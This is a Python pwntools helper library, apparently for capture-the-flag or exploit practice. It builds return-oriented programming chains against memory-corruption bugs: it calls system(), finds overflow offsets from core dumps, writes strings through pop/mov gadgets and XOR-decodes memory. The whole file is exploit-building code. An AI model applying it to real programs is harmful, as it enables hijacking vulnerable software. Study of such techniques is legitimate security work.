#!/usr/bin/env python
import sys
from process import Process
from pwn import *

class PAPA_ROP(Process):

    def __init__(self, filename):
        Process.__init__(self, filename)
        context.log_level = 'CRITICAL'
        context.delete_corefiles = True
        self.elf = context.binary = ELF(filename)
        self.rop = ROP(self.elf)

    #############################
    ##### Pwntools Wrappers #####
    #############################

    # Add to the ROP chain to call system with the given argument
    def system(self, arg):
        self.rop.system(arg)
        return

    # Add to the ROP chain to call a function with the given arguments
    def call(self, function, args=[]):
        self.rop.call(function, args)
        return

    # Get the ROP chain payload
    def chain(self):
        return self.rop.chain()
    
    #######################################
    ##### Overflow Padding Generation #####
    #######################################

    # Generate padding before overflow
    # Optional arguments:
    #   - overflow: function(buffer, *args) -> corefile
    def get_padding(self, overflow=None, *args):
        return "A"*self.get_padding_length(overflow, *args)

    # Get the number of bytes before overflow occurs
    # Optional arguments:
    #   - overflow: function(buffer, *args) -> corefile
    def get_padding_length(self, overflow=None, *args):
        if (overflow == None):
            core = self.start_and_sendline(cyclic(2048))
        else:
            core = overflow(cyclic(2048), *args)

        try:
            sub = p32(core.fault_addr)
        except:
            sub = p64(core.fault_addr)

        return cyclic_find(sub)

    #################################
    ##### Specific ROP Patterns #####
    #################################

    # Write a string to a location using pop and mov gadgets:
    #       pop rDST; pop rSRC; ret (pop gadget)
    #       mov [rDST], rSRC; ret   0x08048899: pop esi; pop edi; ret;(mov gadget)
    # The reverse parameter implies that rDST and rSRC are not in the same order
    # between the gadgets:
    def pop_mov_write(self, pop, mov, what, where, reverse = False):
        # Disable auto construction
        tmp_setting = self.auto_construct_payload
        self.auto_construct_payload = False
        
        # Construct new payload
        payload = ""
        nbytes = 8 if ("64" in self.arch) else 4
        while (what):
            payload += self.p(pop)
            if (reverse):
                payload += what[:nbytes]              
                payload += self.p(where)
            else:
                payload += self.p(where)
                payload += what[:nbytes]
            payload += self.p(mov)
            what = what[nbytes:]
            where += nbytes

        # Reset auto construction
        self.auto_construct_payload = tmp_setting

        # Apply and return result
        self.payload_append(payload)
        return payload

    # XOR the bytes at a given address with a specified key using pop and
    # xor gadgets:
    #   pop rCIP; pop rKEY; ret;
    #   xor byte ptr rCIP, rKEY; ret;
    # The reverse parameter implies that rCIP and rKEY are not in the same
    # order between the gadgets
    def xor_decrypt(self, pop, xor, cipher_addr, key, reverse=False):
        # Disable auto construction
        tmp_setting = self.auto_construct_payload
        self.auto_construct_payload = False
 
        # Construct new payload
        payload = ""
        for key_char in key:
            payload += self.p(pop)
            if (reverse):
                payload += self.p(ord(key_char))
                payload += self.p(cipher_addr)
            else:
                payload += self.p(cipher_addr)
                payload += self.p(ord(key_char))
            payload += self.p(xor)
            cipher_addr += 1

        # Reset auto construction
        self.auto_construct_payload = tmp_setting

        # Apply and return result
        self.payload_append(payload)
        return payload


###################
##### TESTING #####
###################

def proc_interact(buf, path, unused=None):
    p = process(path)
    p.sendline(buf)
    p.wait()
    return p.corefile

def test_module(argv):
    if (len(sys.argv) != 2):
        log.failure("Usage: "+argv[0]+" <test_binary>")
        exit(1) 
    rop = PAPA_ROP(sys.argv[1])
    print rop.get_padding_length()
    print rop.get_padding_length(proc_interact, sys.argv[1])
    print rop.get_padding()
    print rop.get_padding(proc_interact, sys.argv[1], 'test')

if __name__ == "__main__":
    test_module(sys.argv)
